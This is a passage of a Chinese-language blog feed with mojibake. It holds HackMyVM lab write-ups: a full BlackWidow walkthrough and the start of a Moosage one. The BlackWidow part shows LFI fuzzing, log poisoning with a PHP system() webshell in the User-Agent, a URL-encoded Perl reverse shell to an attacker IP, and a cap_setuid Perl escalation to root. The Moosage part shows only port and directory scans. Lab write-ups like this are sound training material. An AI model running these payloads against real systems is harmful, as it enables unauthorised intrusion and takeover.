<br><a data-tooltip-position="top" aria-label="4. ææƒroot" data-href="#4. ææƒroot" href="https://www.c1trus.top/about:blank#4._ææƒroot" class="internal-link" target="_self" rel="noopener nofollow">4. ææƒroot</a><br>
- <a data-tooltip-position="top" aria-label="4.1. ææƒæ£€æµ‹" data-href="#4.1. ææƒæ£€æµ‹" href="https://www.c1trus.top/about:blank#4.1._ææƒæ£€æµ‹" class="internal-link" target="_self" rel="noopener nofollow">4.1. ææƒæ£€æµ‹</a><br>
- <a data-tooltip-position="top" aria-label="4.2. perl &amp; Capabilitiesææƒ" data-href="#4.2. perl &amp; Capabilitiesææƒ" href="https://www.c1trus.top/about:blank#4.2._perl_&amp;_Capabilitiesææƒ" class="internal-link" target="_self" rel="noopener nofollow">4.2. perl &amp; Capabilitiesææƒ</a><br>
é¶æœºé“¾æ¥ <a rel="noopener nofollow" class="external-link" href="https://hackmyvm.eu/machines/machine.php?vm=BlackWidow" target="_blank">https://hackmyvm.eu/machines/machine.php?vm=BlackWidow</a><br>
ä½œè€… <a data-tooltip-position="top" aria-label="https://hackmyvm.eu/profile/?user=0xJin" rel="noopener nofollow" class="external-link" href="https://hackmyvm.eu/profile/?user=0xJin" target="_blank">0xJin</a><br>
éš¾åº¦ â­ï¸â­ï¸â­ï¸â­ï¸ï¸
<br><br><br>â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/hmv/blackwindow]
â””â”€# nmap -sCV 192.168.56.23 -p-
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-23 23:37 EST
Nmap scan report for 192.168.56.23
Host is up (0.00068s latency).
Not shown: 65526 closed tcp ports (reset)
PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 f8:3b:7c:ca:c2:f6:5a:a6:0e:3f:f9:cf:1b:a9:dd:1e (RSA)
|   256 04:31:5a:34:d4:9b:14:71:a0:0f:22:78:2d:f3:b6:f6 (ECDSA)
|_  256 4e:42:8e:69:b7:90:e8:27:68:df:68:8a:83:a7:87:9c (ED25519)
80/tcp    open  http       Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Site doesn't have a title (text/html).
111/tcp   open  rpcbind    2-4 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3           2049/udp   nfs
|   100003  3           2049/udp6  nfs
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      37465/tcp6  mountd
|   100005  1,2,3      53071/udp   mountd
|   100005  1,2,3      54401/tcp   mountd
|   100005  1,2,3      56526/udp6  mountd
|   100021  1,3,4      34897/tcp   nlockmgr
|   100021  1,3,4      46505/tcp6  nlockmgr
|   100021  1,3,4      50253/udp   nlockmgr
|   100021  1,3,4      53399/udp6  nlockmgr
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
2049/tcp  open  nfs        3-4 (RPC #100003)
3128/tcp  open  http-proxy Squid http proxy 4.6
|_http-server-header: squid/4.6
|_http-title: ERROR: The requested URL could not be retrieved
34897/tcp open  nlockmgr   1-4 (RPC #100021)
40851/tcp open  mountd     1-3 (RPC #100005)
51017/tcp open  mountd     1-3 (RPC #100005)
54401/tcp open  mountd     1-3 (RPC #100005)
MAC Address: 08:00:27:41:EE:2C (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.98 seconds

<br><br>192.168.56.23 é¦–é¡µ<br>
<img alt="Pasted image 20241224124937" src="http://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241224124937.png" referrerpolicy="no-referrer"><br>
æ˜¯ä¸€å¼ å›¾ç‰‡ã€‚æŸ¥çœ‹æºä»£ç  æ²¡æœ‰å‘ç°éšè—çš„ä¿¡æ¯<br>å¯¹ 192.168.56.23 è¿›è¡Œç›®å½•æ‰«æ<br>â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/hmv/blackwindow]
â””â”€# dirsearch -u http://192.168.56.23 -x 403
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /root/Desktop/hmv/blackwindow/reports/http_192.168.56.23/_24-12-23_23-45-37.txt

Target: http://192.168.56.23/

[23:45:37] Starting:
[23:45:37] 301 -  311B  - /js  -&gt;  http://192.168.56.23/js/
[23:45:44] 301 -  316B  - /company  -&gt;  http://192.168.56.23/company/
[23:45:45] 301 -  313B  - /docs  -&gt;  http://192.168.56.23/docs/
[23:45:45] 200 -  404B  - /docs/
[23:45:48] 200 -  403B  - /js/

Task Completed

<br>è®¿é—® /company è·¯ç”±æ˜¯ä¸€ä¸ªç½‘ç«™çš„é¦–é¡µ<br>
<img alt="Pasted image 20241224124639" src="http://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241224124639.png" referrerpolicy="no-referrer"><br>æŸ¥çœ‹æºä»£ç ï¼Œå‘ç°æç¤º<br>
<img alt="Pasted image 20241224125230" src="http://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241224125230.png" referrerpolicy="no-referrer"><br>
æç¤ºå‘Šè¯‰æˆ‘ä»¬æœ‰ä¸€ä¸ªphpæ–‡ä»¶ï¼Œå¯ä»¥ä½¿ç”¨ file å‚æ•°è¿›è¡Œæ–‡ä»¶åŒ…å«<br>
ç»§ç»­å¯¹ /company è·¯ç”±è¿›è¡Œç›®å½•æ‰«æ<br>â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/hmv/blackwindow]
â””â”€# gobuster dir -u http://192.168.56.23/company/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.56.23/company/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 278]
/assets               (Status: 301) [Size: 323] [--&gt; http://192.168.56.23/company/assets/]
/forms                (Status: 301) [Size: 322] [--&gt; http://192.168.56.23/company/forms/]
/changelog.txt        (Status: 200) [Size: 1175]
/Readme.txt           (Status: 200) [Size: 222]
/.php                 (Status: 403) [Size: 278]
/started.php          (Status: 200) [Size: 42271]

<br>æ‰«æå‡ºæ¥äº†ä¸€ä¸ª started.php <br>
æµ‹è¯•ä¸€ä¸‹æ˜¯å¦æ˜¯è¿™ä¸ªphpæ–‡ä»¶å­˜åœ¨æ–‡ä»¶åŒ…å«<br>
å°è¯•è¿›è¡Œæœ€ç®€å•çš„æ–‡ä»¶åŒ…å« å‘ç°æ²¡æœ‰å›æ˜¾ã€‚<br><br>æµ‹è¯•ä¸€ä¸‹fuzz<br>â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/hmv/blackwindow]
â””â”€# ffuf -u http://192.168.56.23/company/started.php?file=FUZZ -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-LFISuite-pathtotest-huge.txt |grep -v 'Size: 0'

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.56.23/company/started.php?file=FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-LFISuite-pathtotest-huge.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 1582, Words: 15, Lines: 30, Duration: 6ms]
../../../../../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 1582, Words: 15, Lines: 30, Duration: 8ms]
../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 1582, Words: 15, Lines: 30, Duration: 8ms]
../../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 1582, Words: 15, Lines: 30, Duration: 12ms]
../../../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 1582, Words: 15, Lines: 30, Duration: 14ms]
../../../../../../../../../../../../../etc/group [Status: 200, Size: 727, Words: 1, Lines: 56, Duration: 1ms]
../../../../../../../../../../../../../../../../../../etc/group [Status: 200, Size: 727, Words: 1, Lines: 56, Duration: 4ms]
../../../../../../../../../../../../../../../../etc/group [Status: 200, Size: 727, Words: 1, Lines: 56, Duration: 4ms]
../../../../../../../../../../../../../../etc/group [Status: 200, Size: 727, Words: 1, Lines: 56, Duration: 5ms]

<br>åŸæ¥è¿™ä¸ªç›®å½•ä½äºå¾ˆæ·±å¤„ï¼Œæ‰€ä»¥éœ€è¦å¾ˆå¤šä¸ª ../<br>â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/hmv/blackwindow]
â””â”€# curl http://192.168.56.23/company/started.php?file=../../../../../../../../../../../../../../etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
avahi-autoipd:x:105:112:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
viper:x:1001:1001:Viper,,,:/home/viper:/bin/bash
_rpc:x:107:65534::/run/rpcbind:/usr/sbin/nologin
statd:x:108:65534::/var/lib/nfs:/usr/sbin/nologin

<br><br>æˆ‘ä»¬å…ˆæŸ¥çœ‹æ˜¯å¦å¯ä»¥è®¿é—®apacheçš„æ—¥å¿—<br>
<img alt="Pasted image 20241224131013" src="http://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241224131013.png" referrerpolicy="no-referrer"><br>
å¯ä»¥è®¿é—®ã€‚ æˆ‘ä»¬æ„é€ æ¶æ„çš„UAè¿›è¡Œæ³¨å…¥<br>â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/hmv/blackwindow]
â””â”€# curl http://192.168.56.23/ -A "&lt;?php system(\$_GET['cmd']);phpinfo();?&gt;"
&lt;html&gt;
&lt;img src="wallpaper.jpg" alt="wallpaper" width="100%" height="100%"&gt;
&lt;/html&gt;

<br>å†è®¿é—®æ—¥å¿—å¯ä»¥å‘ç°å·²ç»æ³¨å…¥æœ¨é©¬äº†<br>
<img alt="Pasted image 20241224131251" src="http://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241224131251.png" referrerpolicy="no-referrer"><br>
åå¼¹shell<br>curl http://192.168.56.23/company/started.php?file=../../../../../../../../../../../../../../var/log/apache2/access.log&amp;cmd=perl%20-e%20%27use%20Socket%3B%24i%3D%22192.168.56.6%22%3B%24p%3D1234%3Bsocket%28S%2CPF_INET%2CSOCK_STREAM%2Cgetprotobyname%28%22tcp%22%29%29%3Bif%28connect%28S%2Csockaddr_in%28%24p%2Cinet_aton%28%24i%29%29%29%29%7Bopen%28STDIN%2C%22%3E%26S%22%29%3Bopen%28STDOUT%2C%22%3E%26S%22%29%3Bopen%28STDERR%2C%22%3E%26S%22%29%3Bexec%28%22%2Fbin%2Fbash%20-i%22%29%3B%7D%3B%27

â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/hmv/blackwindow]
â””â”€# pwncat-cs -lp 1234

[00:13:04] Welcome to pwncat ğŸˆ!                                                                  __main__.py:164
[00:14:36] received connection from 192.168.56.23:36872                                                bind.py:84
[00:14:36] 192.168.56.23:36872: registered new host w/ db                                          manager.py:957
(local) pwncat$
(remote) www-data@blackwidow:/var/www/html/company$

<br><br>æˆ‘è¿™é‡Œä¸Šä¼ äº†Linpeasè¿›è¡Œæ£€æµ‹ ï¼Œä½†æ˜¯æ²¡æœ‰å‘ç°å¯ä»¥ç›´æ¥åˆ©ç”¨çš„åœ°æ–¹<br>
çœ‹äº†ä¸€ä¸‹wp å‘ç°sshè®¤è¯æ—¥å¿— auth.log è¢«å¤‡ä»½åœ¨äº† /var/backups/ ç›®å½•<br>
è€Œä¸”æˆ‘ä»¬å¯ä»¥å¯ä»¥è¿›è¡ŒæŸ¥æŸ¥çœ‹<br>(remote) www-data@blackwidow:/var/backups$ ls -l /var/log/auth.log
-rw-r----- 1 root adm 17565 Dec 24 00:32 /var/log/auth.log
(remote) www-data@blackwidow:/var/backups$ ls -l auth.log
-rw-r--r-- 1 root root 31646 Dec 13  2020 auth.log

<br>
å¯ä»¥å‘ç°ï¼Œæ­£å¸¸æƒ…å†µä¸‹ã€‚auth.log åœ¨ /var/log ç›®å½•ï¼Œè€Œä¸”æ™®é€šç”¨æˆ·æ— æ³•æŸ¥çœ‹
<br>ç„¶ååœ¨æ—¥å¿—é‡Œé¢å¯ä»¥æ‰¾åˆ°ä¸€ä¸ªviperç”¨æˆ·çš„å¯†ç  ?V1p3r2020!?<br>Dec 12 16:56:43 test sshd[29560]: Invalid user ?V1p3r2020!? from 192.168.1.109 port 7090

(remote) www-data@blackwidow:/var/backups$ su viper
Password:
viper@blackwidow:/var/backups$

viper@blackwidow:~$ cat local.txt
d930fe79919376e6d08972dae222526b

<br>æˆ‘ä¼°è®¡æ˜¯viperç”¨æˆ·æŠŠå¯†ç å½“æˆç”¨æˆ·åäº†<br><br><br>viper@blackwidow:/tmp$ /sbin/getcap -r / 2&gt;/dev/null
/home/viper/backup_site/assets/vendor/weapon/arsenic = cap_setuid+ep
/usr/bin/perl =
/usr/bin/perl5.28.1 =
/usr/bin/ping = cap_net_raw+ep
/usr/lib/squid/pinger = cap_net_raw+ep
<br>å‘ç° arsenic å…·æœ‰ cap_setuid å…·æœ‰ cap_setuid å³å…è®¸è¿›ç¨‹æ›´æ”¹å…¶æœ‰æ•ˆç”¨æˆ· IDã€‚<br>æŸ¥çœ‹ä¸€ä¸‹ arsenic çš„å¸®åŠ©æ–‡æ¡£<br>viper@blackwidow:~/backup_site/assets/vendor/weapon$ ./arsenic -h

Usage: ./arsenic [switches] [--] [programfile] [arguments]
  -0[octal]         specify record separator (\0, if no argument)
  -a                autosplit mode with -n or -p (splits $_ into @F)
  -C[number/list]   enables the listed Unicode features
  -c                check syntax only (runs BEGIN and CHECK blocks)
  -d[:debugger]     run program under debugger
  -D[number/list]   set debugging flags (argument is a bit mask or alphabets)
  -e program        one line of program (several -e's allowed, omit programfile)
  -E program        like -e, but enables all optional features
  -f                don't do $sitelib/sitecustomize.pl at startup
  -F/pattern/       split() pattern for -a switch (//'s are optional)
  -i[extension]     edit &lt;&gt; files in place (makes backup if extension supplied)
  -Idirectory       specify @INC/#include directory (several -I's allowed)
  -l[octal]         enable line ending processing, specifies line terminator
  -[mM][-]module    execute "use/no module..." before executing program
  -n                assume "while (&lt;&gt;) { ... }" loop around program
  -p                assume loop like -n but print line also, like sed
  -s                enable rudimentary parsing for switches after programfile
  -S                look for programfile using PATH environment variable
  -t                enable tainting warnings
  -T                enable tainting checks
  -u                dump core after parsing program
  -U                allow unsafe operations
  -v                print version, patchlevel and license
  -V[:variable]     print configuration summary (or a single Config.pm variable)
  -w                enable many useful warnings
  -W                enable all warnings
  -x[directory]     ignore text before #!perl line (optionally cd to directory)
  -X                disable all warnings

Run 'perldoc perl' for more help with Perl.

<br>åœ¨Gptçš„å¸®åŠ©ä¸‹ï¼Œè®¤ä¸ºè¿™ä¸ªè¿™ä¸ªç¨‹åºåº”è¯¥å°±æ˜¯ä¸€ä¸ªPerlï¼Œå¯ä»¥å…è®¸Perlè„šæœ¬<br><br><a rel="noopener nofollow" class="external-link" href="https://gtfobins.github.io/gtfobins/perl/#capabilities" target="_blank">https://gtfobins.github.io/gtfobins/perl/#capabilities</a><br>
<img alt="Pasted image 20241224135317" src="http://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241224135317.png" referrerpolicy="no-referrer"><br>viper@blackwidow:~/backup_site/assets/vendor/weapon$ vi getroot.pl
viper@blackwidow:~/backup_site/assets/vendor/weapon$ ./arsenic  getroot.pl
# cat getroot.pl
use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";

# whoami
root

# cat /root/root.txt


â–„â–„â–„â–„Â· â–„â–„â–Œ   â–„â–„â–„Â·  â–„â–„Â· â–„ â€¢â–„     â–„â–„â–Œ â– â–„â–Œâ–ª  Â·â–„â–„â–„â–„        â–„â–„â–Œ â– â–„â–Œ
â–â–ˆ â–€â–ˆâ–ªâ–ˆâ–ˆâ€¢  â–â–ˆ â–€â–ˆ â–â–ˆ â–Œâ–ªâ–ˆâ–Œâ–„â–Œâ–ª    â–ˆâ–ˆÂ· â–ˆâ–Œâ–â–ˆâ–ˆâ–ˆ â–ˆâ–ˆâ–ª â–ˆâ–ˆ â–ª     â–ˆâ–ˆÂ· â–ˆâ–Œâ–â–ˆ
â–â–ˆâ–€â–€â–ˆâ–„â–ˆâ–ˆâ–ª  â–„â–ˆâ–€â–€â–ˆ â–ˆâ–ˆ â–„â–„â–â–€â–€â–„Â·    â–ˆâ–ˆâ–ªâ–â–ˆâ–â–â–Œâ–â–ˆÂ·â–â–ˆÂ· â–â–ˆâ–Œ â–„â–ˆâ–€â–„ â–ˆâ–ˆâ–ªâ–â–ˆâ–â–â–Œ
â–ˆâ–ˆâ–„â–ªâ–â–ˆâ–â–ˆâ–Œâ–â–Œâ–â–ˆ â–ªâ–â–Œâ–â–ˆâ–ˆâ–ˆâ–Œâ–â–ˆ.â–ˆâ–Œ    â–â–ˆâ–Œâ–ˆâ–ˆâ–â–ˆâ–Œâ–â–ˆâ–Œâ–ˆâ–ˆ. â–ˆâ–ˆ â–â–ˆâ–Œ.â–â–Œâ–â–ˆâ–Œâ–ˆâ–ˆâ–â–ˆâ–Œ
Â·â–€â–€â–€â–€ .â–€â–€â–€  â–€  â–€ Â·â–€â–€â–€ Â·â–€  â–€     â–€â–€â–€â–€ â–€â–ªâ–€â–€â–€â–€â–€â–€â–€â–€â€¢  â–€â–ˆâ–„â–€â–ª â–€â–€â–€â–€ â–€â–ª


Congrats!

You've rooted Black Widow!

0xJin - mindsflee
Follow on Instagram: 0xjiin
Follow on Twitter: 0xJin , @mindsflee


0780eb289a44ba17ea499ffa6322b335

]]></description><link>https://www.c1trus.top/24-æ¸—é€/hmv/47.blackwidow.html</link><guid isPermaLink="false">24-æ¸—é€/HMV/47.BlackWidow.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate><enclosure url="http://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241224124937.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src="http://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241224124937.png"&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[46.moosage]]></title><description><![CDATA[ 
 <br><br>
<br><a data-tooltip-position="top" aria-label="1. åŸºæœ¬ä¿¡æ¯^toc" data-href="#1. åŸºæœ¬ä¿¡æ¯^toc" href="https://www.c1trus.top/about:blank#1._åŸºæœ¬ä¿¡æ¯^toc" class="internal-link" target="_self" rel="noopener nofollow">1. åŸºæœ¬ä¿¡æ¯</a>
<br><a data-tooltip-position="top" aria-label="2. ä¿¡æ¯æ”¶é›†" data-href="#2. ä¿¡æ¯æ”¶é›†" href="https://www.c1trus.top/about:blank#2._ä¿¡æ¯æ”¶é›†" class="internal-link" target="_self" rel="noopener nofollow">2. ä¿¡æ¯æ”¶é›†</a>

<br><a data-tooltip-position="top" aria-label="2.1. ç«¯å£æ‰«æ" data-href="#2.1. ç«¯å£æ‰«æ" href="https://www.c1trus.top/about:blank#2.1._ç«¯å£æ‰«æ" class="internal-link" target="_self" rel="noopener nofollow">2.1. ç«¯å£æ‰«æ</a>
<br><a data-tooltip-position="top" aria-label="2.2. ç›®å½•æ‰«æ" data-href="#2.2. ç›®å½•æ‰«æ" href="https://www.c1trus.top/about:blank#2.2._ç›®å½•æ‰«æ" class="internal-link" target="_self" rel="noopener nofollow">2.2. ç›®å½•æ‰«æ</a>
<br><a data-tooltip-position="top" aria-label="2.3. æºç è·å–" data-href="#2.3. æºç è·å–" href="https://www.c1trus.top/about:blank#2.3._æºç è·å–" class="internal-link" target="_self" rel="noopener nofollow">2.3. æºç è·å–</a>


<br><a data-tooltip-position="top" aria-label="3. å›¾ç‰‡é©¬å¼¹shell" data-href="#3. å›¾ç‰‡é©¬å¼¹shell" href="https://www.c1trus.top/about:blank#3._å›¾ç‰‡é©¬å¼¹shell" class="internal-link" target="_self" rel="noopener nofollow">3. å›¾ç‰‡é©¬å¼¹shell</a>
<br><a data-tooltip-position="top" aria-label="4. ææƒbacaç”¨æˆ·" data-href="#4. ææƒbacaç”¨æˆ·" href="https://www.c1trus.top/about:blank#4._ææƒbacaç”¨æˆ·" class="internal-link" target="_self" rel="noopener nofollow">4. ææƒbacaç”¨æˆ·</a>
<br><a data-tooltip-position="top" aria-label="5. ææƒroot" data-href="#5. ææƒroot" href="https://www.c1trus.top/about:blank#5._ææƒroot" class="internal-link" target="_self" rel="noopener nofollow">5. ææƒroot</a><br>
- <a data-tooltip-position="top" aria-label="5.1. ä¿®æ”¹sshç™»å½•è„šæœ¬ææƒ" data-href="#5.1. ä¿®æ”¹sshç™»å½•è„šæœ¬ææƒ" href="https://www.c1trus.top/about:blank#5.1._ä¿®æ”¹sshç™»å½•è„šæœ¬ææƒ" class="internal-link" target="_self" rel="noopener nofollow">5.1. ä¿®æ”¹sshç™»å½•è„šæœ¬ææƒ</a><br>
é¶æœºé“¾æ¥ <a rel="noopener nofollow" class="external-link" href="https://hackmyvm.eu/machines/machine.php?vm=Moosage" target="_blank">https://hackmyvm.eu/machines/machine.php?vm=Moosage</a><br>
ä½œè€… <a data-tooltip-position="top" aria-label="https://hackmyvm.eu/profile/?user=sml" rel="noopener nofollow" class="external-link" href="https://hackmyvm.eu/profile/?user=sml" target="_blank">sml</a><br>
éš¾åº¦ â­ï¸â­ï¸â­ï¸â­ï¸ï¸
<br><br><br>â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/hmv/moosage]
â””â”€# nmap 192.168.56.22 -p-
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-23 05:27 EST
Nmap scan report for 192.168.56.22
Host is up (0.0011s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:AE:F2:FE (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 2.29 seconds

<br><br>â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/hmv/moosage]
â””â”€# dirsearch -u http://192.168.56.22
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /root/Desktop/hmv/moosage/reports/http_192.168.56.22/_24-12-23_05-32-23.txt

Target: http://192.168.56.22/

[05:32:23] Starting:
[05:32:29] 301 -  185B  - /blog  -&gt;  http://192.168.56.22/blog/
[05:32:29] 200 -   10KB - /blog/

Task Completed


â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/hmv/moosage]
â””â”€# dirsearch -u http://192.168.56.22/blog/
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /root/Desktop/hmv/moosage/reports/http_192.168.56.22/_blog__24-12-23_05-33-02.txt

Target: http://192.168.56.22/

[05:33:02] Starting: blog/
[05:33:02] 301 -  185B  - /blog/.git  -&gt;  http://192.168.56.22/blog/.git/
[05:33:02] 403 -  571B  - /blog/.git/
[05:33:02] 200 -  254B  - /blog/.git/config
[05:33:02] 200 -   73B  - /blog/.git/description
[05:33:02] 200 -   23B  - /blog/.git/HEAD
[05:33:02] 403 -  571B  - /blog/.git/hooks/
[05:33:02] 403 -  571B  - /blog/.git/branches/
[05:33:02] 200 -   10KB - /blog/.git/index
[05:33:02] 403 -  571B  - /blog/.git/info/
[05:33:02] 200 -  240B  - /blog/.git/info/exclude
[05:33:02] 200 -  168B  - /blog/.git/logs/HEAD
[05:33:02] 301 -  185B  - /blog/.git/logs/refs  -&gt;  http://192.168.56.22/blog/.git/logs/refs/
[05:33:02] 301 -  185B  - /blog/.git/logs/refs/heads  -&gt;  http://192.168.56.22/blog/.git/logs/refs/heads/
[05:33:02] 301 -  185B  - /blog/.git/logs/refs/remotes  -&gt;  http://192.168.56.22/blog/.git/logs/refs/remotes/
[05:33:02] 301 -  185B  - /blog/.git/logs/refs/remotes/origin  -&gt;  http://192.168.56.22/blog/.git/logs/refs/remotes/origin/
[05:33:02] 403 -  571B  - /blog/.git/objects/
[05:33:02] 403 -  571B  - /blog/.git/refs/
[05:33:02] 200 -   41B  - /blog/.git/refs/heads/master
[05:33:02] 200 -    1KB - /blog/.git/packed-refs
[05:33:02] 200 -  168B  - /blog/.git/logs/refs/heads/master
[05:33:02] 200 -  168B  - /blog/.git/logs/refs/remotes/origin/HEAD
[05:33:02] 301 -  185B  - /blog/.git/refs/heads  -&gt;  http://192.168.56.22/blog/.git/refs/heads/
[05:33:02] 301 -  185B  - /blog/.git/refs/remotes  -&gt;  http://192.168.56.22/blog/.git/refs/remotes/
[05:33:02] 403 -  571B  - /blog/.git/logs/
[05:33:02] 200 -   32B  - /blog/.git/refs/remotes/origin/HEAD
[05:33:02] 301 -  185B  - /blog/.git/refs/tags  -&gt;  http://192.168.56.22/blog/.git/refs/tags/
[05:33:02] 301 -  185B  - /blog/.git/refs/remotes/origin  -&gt;  http://192.168.56.22/blog/.git/refs/remotes/origin/
[05:33:02] 200 -  171B  - /blog/.gitignore
[05:33:02] 200 -  300B  - /blog/.htaccess
[05:33:07] 200 -   37B  - /blog/ajax.php
[05:33:07] 301 -  185B  - /blog/app  -&gt;  http://192.168.56.22/blog/app/
[05:33:07] 403 -  571B  - /blog/app/
[05:33:09] 200 -    0B  - /blog/common.php
[05:33:09] 200 -    1KB - /blog/config.ini
[05:33:10] 301 -  185B  - /blog/data  -&gt;  http://192.168.56.22/blog/data/
[05:33:10] 403 -  571B  - /blog/data/
[05:33:10] 200 -  754B  - /blog/docker-compose.yml
[05:33:10] 200 -  680B  - /blog/Dockerfile
[05:33:11] 200 -    1KB - /blog/favicon.ico
[05:33:13] 200 -   34KB - /blog/LICENSE
[05:33:17] 200 -    8KB - /blog/README.md
[05:33:18] 200 -   25B  - /blog/robots.txt
[05:33:19] 301 -  185B  - /blog/static  -&gt;  http://192.168.56.22/blog/static/

Task Completed

